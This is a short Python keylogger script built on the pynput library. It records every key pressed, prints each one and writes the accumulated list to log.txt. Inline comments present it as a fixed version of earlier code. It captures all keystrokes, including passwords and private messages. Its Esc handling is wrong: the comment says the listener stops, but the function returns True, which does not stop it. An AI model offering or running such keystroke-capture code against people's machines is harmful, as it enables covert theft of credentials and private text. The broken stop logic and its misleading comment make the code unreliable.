import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)  # Fix variable name issue
    write_file(keys)
    
    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))  # Fix print format

def write_file(keys):
    with open('log.txt', 'w') as f:  # Consider changing 'w' to 'a' for appending
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k + "\n")  # Fix file output for readability

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:  # Fix comparison to escape key
        return True  # Stop listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
  